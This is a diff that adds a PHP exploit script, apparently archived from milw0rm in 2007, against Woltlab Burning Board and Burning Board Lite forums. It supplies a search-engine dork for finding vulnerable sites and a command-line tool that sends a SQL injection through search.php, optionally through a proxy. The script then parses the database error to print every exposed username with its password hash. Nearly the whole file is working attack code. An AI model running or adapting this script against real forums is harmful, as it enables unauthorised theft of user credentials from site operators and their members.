@@ -1,0 +1,154 @@
+<?php
+
+/*
+###################################
+# http://www.undergroundagents.de #
+# coded by silent vapor           #
+# webmaster@undergroundagents.de  #
+###################################
+*/
+
+print_r('
+--------------------------------------------------------------------------------
+Woltlab Burning Board Lite <= 1.0.2 GetHashes over search.php
+Woltlab Burning Board <= 2.3.6 GetHashes over search.php
+by silent vapor (webmaster@undergroundagents.de)
+site: http://www.undergroundagents.de
+dork: "Powered by Burning Board Lite 1.0.2" or
+     "Powered by Burning Board 2.3.6"
+--------------------------------------------------------------------------------
+');
+
+if ($argc<3) {
+   print_r('
+--------------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path boardid searchstring OPTIONS
+host:             target server (ip/hostname)
+path:             path to wbblite
+boardid:          a boardid where you will search
+searchstring:     a searchstring, that will be found in this board
+
+Options:
+ -o[prefix]:     " a table prefix (default: bb1_)
+ -p[port]:       " a port other than 80
+ -P[ip:port]:    " a proxy
+ -t[n]:          " adjust query timeout (default: 10)
+
+Example:
+php '.$argv[0].' localhost /wbblite/ 28 avatar
+ "       "       localhost / 29 cpu -p81 -P127.0.0.1:8080
+--------------------------------------------------------------------------------
+');
+   die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacketii($packet)
+{
+ global $proxy, $host, $port, $html, $proxy_regex;
+ if ($proxy=='') {
+   $ock=fsockopen(gethostbyname($host),$port);
+   if (!$ock) {
+     echo 'No response from '.$host.':'.$port; die;
+   }
+ }
+ else {
+       $c = preg_match($proxy_regex,$proxy);
+   if (!$c) {
+     echo 'Not a valid proxy...';die;
+   }
+   $parts=explode(':',$proxy);
+   echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+   $ock=fsockopen($parts[0],$parts[1]);
+   if (!$ock) {
+     echo 'No response from proxy...';die;
+       }
+ }
+ fputs($ock,$packet);
+ if ($proxy=='') {
+   $html='';
+   while (!feof($ock)) {
+     $html.=fgets($ock);
+   }
+ }
+ else {
+   $html='';
+   while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+     $html.=fread($ock,1);
+   }
+ }
+ fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$boardid=$argv[3];
+$searchstring=$argv[4];
+
+$prefix = "bb1_";
+$port=80;
+$timeout=10;
+$proxy="";
+
+for ($i=5; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if ($temp=="-p")
+{
+ $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+ $proxy=str_replace("-P","",$argv[$i]);
+}
+if ($temp=="-t")
+{
+ $timeout=(int) str_replace("-t","",$argv[$i]);
+}
+if ($temp=="-o")
+{
+ $prefix=str_replace("-o","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+$path .= "search.php";
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$boardids="boardids%5B%5D=$boardid) UNION SELECT username,password FROM ".$prefix."users WHERE 1 NOT IN (0,0";
+$data = "searchstring=$searchstring&searchuser=&name_exactly=1&$boardids&showposts=0&searchdate=0";
+$data .= "&beforeafter=after&sortby=lastpost&sortorder=desc&send=send&submit=Suchen";
+
+$packet ="POST ".$p." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Cookie: wbb_userpassword=0;\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+
+sendpacketii($packet);
+
+if (eregi("Database error",$html)){
+   echo "<b>vulnerable...</b><br><br>";
+   $temp1=explode("b.boardid IN (",$html);
+   $temp2=explode(")",$temp1[1]);
+   $temp3=explode("&sid=",$temp2[0]);
+   $temp4=$temp3[0];
+   $temp5=explode(",",$temp4);
+
+   for ($i=0;$i<count($temp5);$i++)
+   {
+    if ($i%2 == 0)
+     echo $temp5[$i]." ( Hash: ";
+   else
+     echo $temp5[$i].")<br>";
+   }
+}
+
+?>
+
+# milw0rm.com [2007-01-17]
